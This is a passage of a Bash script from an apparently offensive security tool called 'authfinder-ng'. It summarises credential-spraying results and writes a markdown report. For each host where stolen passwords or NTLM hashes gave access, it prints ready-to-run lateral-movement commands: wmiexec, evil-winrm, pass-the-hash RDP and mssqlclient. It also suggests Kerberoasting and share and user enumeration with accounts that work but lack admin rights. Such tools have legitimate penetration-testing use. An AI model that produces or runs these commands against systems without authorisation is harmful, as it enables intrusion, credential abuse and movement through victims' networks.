    lprint "${BOLD}${LC}══════════════════════════════════════════════════════════════${NC}"

    local -a hits=()  auth_hits=()
    [[ -f "$HITS_FILE" ]] && mapfile -t hits < "$HITS_FILE"
    [[ -f "$AUTH_FILE" ]] && mapfile -t auth_hits < "$AUTH_FILE"

    # Exec hits
    if [[ ${#hits[@]} -gt 0 ]]; then
        lprint ""
        lprint "${LG}${BOLD}  ╔═══ EXECUTION ACCESS — ${#hits[@]} hit(s) ═══╗${NC}"
        lprint ""
        printf "  ${BOLD}%-18s %-10s %-6s %-20s %-8s${NC}\n" "IP" "PROTO" "PORT" "USER" "ADMIN"
        lprint "  $(printf '%.0s─' {1..65})"
        for entry in "${hits[@]}"; do
            IFS='|' read -r ip proto port user cred is_hash is_admin <<< "$entry"
            local adm="${DIM}no${NC}"
            [[ "$is_admin" != "no" ]] && adm="${LR}${BOLD}${is_admin}${NC}"
            printf "  ${LG}%-18s${NC} ${Y}%-10s${NC} %-6s ${LC}%-20s${NC} " "$ip" "$proto" "$port" "$user"
            echo -e "$adm"
        done
        lprint ""
        lprint "${BOLD}  Ready-to-run shell commands:${NC}"
        for entry in "${hits[@]}"; do
            IFS='|' read -r ip proto port user cred is_hash is_admin <<< "$entry"
            lprint "  ${DIM}# ${ip} — ${proto}:${port} as ${user} [${is_admin}]${NC}"
            local dp="${DOMAIN:+${DOMAIN}/}"
            local h="${cred#:}"; h="${h//\'/}"
            case "$proto" in
                smb|wmi)
                    if [[ "$is_hash" == "1" ]]; then
                        lprint "  ${OR}$(imp wmiexec) -hashes :${h} '${dp}${user}'@${ip}${NC}"
                    else
                        lprint "  ${OR}$(imp wmiexec) '${dp}${user}':'${cred}'@${ip}${NC}"
                    fi ;;
                winrm)
                    if [[ "$is_hash" == "1" ]]; then
                        lprint "  ${OR}evil-winrm -i ${ip} -u '${user}' -H '${h}' -P ${port}${NC}"
                    else
                        lprint "  ${OR}evil-winrm -i ${ip} -u '${user}' -p '${cred}' -P ${port}${NC}"
                    fi ;;
                rdp)
                    if [[ "$is_hash" == "1" ]]; then
                        lprint "  ${OR}${RDP_BIN} /v:${ip}:${port} /u:'${user}' /pth:${h} ${RDP_CERT} /dynamic-resolution +clipboard${NC}"
                    else
                        lprint "  ${OR}${RDP_BIN} /v:${ip}:${port} /u:'${user}' /p:'${cred}' ${RDP_CERT} /dynamic-resolution +clipboard${NC}"
                    fi ;;
                ssh) lprint "  ${OR}ssh '${user}'@${ip} -p ${port}${NC}" ;;
                mssql)
                    if [[ "$is_hash" == "1" ]]; then
                        lprint "  ${OR}$(imp mssqlclient) -hashes :${h} '${dp}${user}'@${ip} -windows-auth${NC}"
                    else
                        lprint "  ${OR}$(imp mssqlclient) '${dp}${user}':'${cred}'@${ip} -windows-auth${NC}"
                    fi ;;
            esac
            lprint ""
        done
    fi

    # Auth-only hits
    if [[ ${#auth_hits[@]} -gt 0 ]]; then
        lprint "${Y}${BOLD}  ╔═══ VALID CREDS (no exec) — ${#auth_hits[@]} hit(s) ═══╗${NC}"
        lprint "  ${DIM}Valid credentials — not local admin. Use for enumeration.${NC}"
        lprint ""
        for entry in "${auth_hits[@]}"; do
            IFS='|' read -r ip proto port user cred <<< "$entry"
            lprint "  ${Y}${ip}${NC} — ${proto}:${port} — ${LC}${user}${NC}"
            local af; af=$(nxc_auth "$user" "$cred" "0")
            p_cmd_display "${NXC} smb ${ip} ${af} --shares --users --pass-pol"
            p_cmd_display "${NXC} ldap ${ip} ${af} --kerberoasting kerberoast_${user}.txt"
        done
        lprint ""
    fi

    if [[ ${#hits[@]} -eq 0 && ${#auth_hits[@]} -eq 0 ]]; then
        lprint "${FAIL} No access found"
        lprint ""
        lprint "  Troubleshooting:"
        lprint "  • Verify creds manually: ${NXC} smb TARGET -u USER -p PASS"
        [[ -z "$DOMAIN" ]] && lprint "  • Domain account? Add: -d DOMAIN"
        lprint "  • Local account? Add: --local-auth"
        lprint "  • Non-standard ports? Try: --rescan"
        lprint "  • Locked out? Check policy: ${NXC} smb TARGET -u '' -p '' --pass-pol"
    fi

    [[ -n "$CMD_LOG" && -f "$CMD_LOG" ]] && \
        lprint "${INFO} Command log saved: ${BOLD}${CMD_LOG}${NC}"
    [[ -n "$REPORT_FILE" ]] && { generate_report; lprint "${OK} Report saved: ${BOLD}${REPORT_FILE}${NC}"; }

    lprint "${BOLD}${LC}══════════════════════════════════════════════════════════════${NC}"
}

generate_report() {
    {
        echo "# authfinder-ng v${VERSION} Report"
        echo "**Date:** $(date)"
        echo "**Target:** ${TARGET}"
        [[ -n "$DOMAIN" ]] && echo "**Domain:** ${DOMAIN}"
        echo ""
        echo "## Commands Run"
        echo '```'
        [[ -f "$CMD_LOG" ]] && cat "$CMD_LOG"
        echo '```'
        echo ""
        if [[ -f "$HITS_FILE" && -s "$HITS_FILE" ]]; then
            echo "## Execution Access"
            echo "| IP | Protocol | Port | User | Admin |"
            echo "|----|----------|------|------|-------|"
            while IFS='|' read -r ip proto port user cred is_hash is_admin; do
                echo "| \`${ip}\` | ${proto} | ${port} | ${user} | ${is_admin} |"
            done < "$HITS_FILE"
            echo ""
